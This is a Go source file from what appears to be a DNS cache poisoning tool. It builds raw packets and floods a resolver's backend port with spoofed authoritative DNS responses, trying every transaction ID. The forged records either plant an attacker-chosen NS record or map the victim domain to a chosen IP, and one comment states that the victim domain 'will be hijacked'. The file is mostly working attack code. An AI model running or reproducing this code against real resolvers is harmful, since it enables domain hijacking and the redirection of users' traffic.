package main

import (
	"fmt"
	"github.com/google/gopacket/layers"
	"math/rand"
	"net"
	"time"
)

var bruteForceCouldBeKilled bool

func sendDNSRequest(id uint16, name string) {
	if debugOutput {
		fmt.Println("Send new DNS request", name, id)
	}
	_sendDNSRequest(id, name, localIP[0], resolverIP, (layers.UDPPort)(rand.Uint32()), 53)
}

func _sendDNSRequest(id uint16, name string, src net.IP, dst net.IP, sport layers.UDPPort, dport layers.UDPPort) {
	ipLayer := layers.IPv4{
		Id:       1,
		SrcIP:    src,
		DstIP:    dst,
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
		Flags:    layers.IPv4DontFragment,
	}
	udpLayer := layers.UDP{
		SrcPort: sport,
		DstPort: dport,
	}
	dnsLayer := layers.DNS{
		ID:           id,
		QR:           false,
		OpCode:       0,
		AA:           false,
		TC:           false,
		RD:           true,
		RA:           false,
		Z:            0,
		ResponseCode: 0,
		QDCount:      1,
		ANCount:      0,
		NSCount:      0,
		ARCount:      0,
		Questions: []layers.DNSQuestion{{
			Name:  []byte(name),
			Type:  layers.DNSTypeA,
			Class: layers.DNSClassIN,
		}},
		Authorities: nil,
		Additionals: nil,
	}
	err := udpLayer.SetNetworkLayerForChecksum(&ipLayer)
	if err != nil {
		fmt.Println("udpLayer.SetNetworkLayerForChecksum @ dns.go pos 0 error", err)
	}
	err = Send(handle, ethernetLayer, &ipLayer, &udpLayer, &dnsLayer)
	if err != nil {
		fmt.Println("can not send packet @ sendDNSRequest: ", err)
	}
}

func bruteForceTerminatingTimer(timegap uint) {
	time.Sleep(time.Duration(timegap) * time.Millisecond)
	bruteForceCouldBeKilled = true
}

func dnsBruteForce(targetPort uint16, timegap uint, resolverBackendIP net.IP, auxDomain string) {
	bruteForceShouldBeKilled = true
	bruteForceCouldBeKilled = false
	ipLayer := layers.IPv4{
		Id:       2,
		SrcIP:    authIP,
		DstIP:    resolverBackendIP,
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
		Flags:    layers.IPv4DontFragment,
	}
	udpLayer := layers.UDP{
		SrcPort: 53,
		DstPort: layers.UDPPort(targetPort),
	}
	dnsLayer := layers.DNS{
		ID:           0,
		QR:           true,
		OpCode:       0,
		AA:           true,
		TC:           false,
		RD:           false,
		RA:           false,
		Z:            0,
		ResponseCode: layers.DNSResponseCodeNoErr,

		/* Answers for A request for ns.a.com */
		//Questions: []layers.DNSQuestion{{
		//	Name:  []byte(victimAuthName),
		//	Type:  layers.DNSTypeA,
		//	Class: layers.DNSClassIN,
		//}},
		//Answers: []layers.DNSResourceRecord{{
		//	Name:  []byte(victimAuthName),
		//	Type:  layers.DNSTypeA,
		//	Class: layers.DNSClassIN,
		//	TTL:   300,
		//	IP:    net.ParseIP(""),
		//	CNAME: nil,
		//	PTR:   nil,
		//	TXTs:  nil,
		//	SOA:   layers.DNSSOA{},
		//	SRV:   layers.DNSSRV{},
		//	MX:    layers.DNSMX{},
		//	OPT:   nil,
		//	TXT:   nil,
		//}},
		//Authorities: nil,
		//Additionals: nil,

		/* Answers for A request for www.a.com */
		//Questions: []layers.DNSQuestion{{
		//	Name:  []byte(victimDNSName),
		//	Type:  layers.DNSTypeA,
		//	Class: layers.DNSClassIN,
		//}},
		//Answers: []layers.DNSResourceRecord{{
		//	Name:  []byte(victimDNSName),
		//	Type:  layers.DNSTypeA,
		//	Class: layers.DNSClassIN,
		//	TTL:   300,
		//	IP:    net.ParseIP(""),
		//	CNAME: nil,
		//	PTR:   nil,
		//	TXTs:  nil,
		//	SOA:   layers.DNSSOA{},
		//	SRV:   layers.DNSSRV{},
		//	MX:    layers.DNSMX{},
		//	OPT:   nil,
		//	TXT:   nil,
		//}},
		//Authorities: nil,
		//Additionals: nil,

		/* Answers for A request for ***.www.a.com */
		//Questions: []layers.DNSQuestion{{
		//	Name:  []byte(dnsQueryName),
		//	Type:  layers.DNSTypeA,
		//	Class: layers.DNSClassIN,
		//}},
		//Authorities: []layers.DNSResourceRecord{{
		//	Name:  []byte(victimDNSName),
		//	Type:  layers.DNSTypeNS,
		//	Class: layers.DNSClassIN,
		//	TTL:   300,
		//	IP:    nil,
		//	NS:    []byte(auxDomain),
		//	CNAME: nil,
		//	PTR:   nil,
		//	TXTs:  nil,
		//	SOA:   layers.DNSSOA{},
		//	SRV:   layers.DNSSRV{},
		//	MX:    layers.DNSMX{},
		//	OPT:   nil,
		//	TXT:   nil,
		//}},
		//Answers:     nil,
		//Additionals: nil,
	}

	if !attackForwarder {
		dnsLayer.Questions = []layers.DNSQuestion{{
			Name:  []byte(dnsQueryName),
			Type:  layers.DNSTypeA,
			Class: layers.DNSClassIN,
		}}
		dnsLayer.Authorities = []layers.DNSResourceRecord{{
			Name:  []byte(victimDNSName),
			Type:  layers.DNSTypeNS,
			Class: layers.DNSClassIN,
			TTL:   300,
			IP:    nil,
			NS:    []byte(auxDomain),
			CNAME: nil,
			PTR:   nil,
			TXTs:  nil,
			SOA:   layers.DNSSOA{},
			SRV:   layers.DNSSRV{},
			MX:    layers.DNSMX{},
			OPT:   nil,
			TXT:   nil,
		}}
		dnsLayer.Answers = nil
		dnsLayer.Additionals = nil
	} else {
		/* Change these flags accordingly to the request sent by the resolver. */
		dnsLayer.AA = false
		dnsLayer.RD = true
		dnsLayer.RA = true
		dnsLayer.Questions = []layers.DNSQuestion{{
			Name:  []byte(dnsQueryName),
			Type:  layers.DNSTypeA,
			Class: layers.DNSClassIN,
		}}
		dnsLayer.Answers = []layers.DNSResourceRecord{{
			Name:  []byte(dnsQueryName),
			Type:  layers.DNSTypeCNAME,
			Class: layers.DNSClassIN,
			TTL:   300,
			IP:    nil,
			NS:    nil,
			CNAME: []byte(victimDNSName),
			PTR:   nil,
			TXTs:  nil,
			SOA:   layers.DNSSOA{},
			SRV:   layers.DNSSRV{},
			MX:    layers.DNSMX{},
			OPT:   nil,
			TXT:   nil,
		}, {
			Name:  []byte(victimDNSName),
			Type:  layers.DNSTypeA,
			Class: layers.DNSClassIN,
			TTL:   300,
			/* Fill with any IP you want. The victim domain will be hijacked to this IP. */
			IP:    net.ParseIP("1.2.3.4"),
			NS:    nil,
			CNAME: nil,
			PTR:   nil,
			TXTs:  nil,
			SOA:   layers.DNSSOA{},
			SRV:   layers.DNSSRV{},
			MX:    layers.DNSMX{},
			OPT:   nil,
			TXT:   nil,
		}}
	}

	err := udpLayer.SetNetworkLayerForChecksum(&ipLayer)
	if err != nil {
		fmt.Println("udpLayer.SetNetworkLayerForChecksum @ dns.go error", err)
	}
	if debugOutput {
		fmt.Println("DNS BruteForce: ", targetPort)
	}

	startTime := time.Now()
	var txid uint16
	//try to see if this port is open in reality
	for txid = 0; txid < GROUP_SIZE*2; txid++ {
		dnsLayer.ID = txid
		err = Send(handle, ethernetLayer, &ipLayer, &udpLayer, &dnsLayer)
		if err != nil {
			fmt.Println("can not send packet @ sendDNSRequest pos 1: ", err)
		}
		time.Sleep(time.Duration(timegap) * time.Microsecond)
	}

	/* This is used for early termination */
	//verification packet
	//xmitUDPv4(localIP, resolverBackendIP, layers.UDPPort(targetPort), 65535, 2, 0)
	//go bruteForceTerminatingTimer( /*jitter + defaultJitter*/ defaultJitter + 60)

	//continue brute force
	for txid = GROUP_SIZE * 2; txid < 0xffff; txid++ {
		/* This is used for early termination */
		//if bruteForceCouldBeKilled && bruteForceShouldBeKilled {
		//	fmt.Println("DNS Brute force aborted")
		//	break
		//}
		dnsLayer.ID = txid
		err := Send(handle, ethernetLayer, &ipLayer, &udpLayer, &dnsLayer)
		if err != nil {
			fmt.Println("can not send packet @ DNSBruteForce: ", err)
		}
		if timegap != 0 {
			time.Sleep(time.Duration(timegap) * time.Microsecond)
		}
	}

	//0xffff is missing from packet trace
	/* This is used for early termination */
	//if !bruteForceShouldBeKilled {
	dnsLayer.ID = 0xffff
	err = Send(handle, ethernetLayer, &ipLayer, &udpLayer, &dnsLayer)
	if err != nil {
		fmt.Println("can not send packet @ DNSBruteForce pos 2: ", err)
	}
	//}
	if debugOutput {
		fmt.Println("time: ", time.Now().Sub(startTime))
	}

	//help to recover the global counter
	time.Sleep(time.Duration(60+ /*jitter + defaultJitter*/ defaultJitter) * time.Millisecond)
}
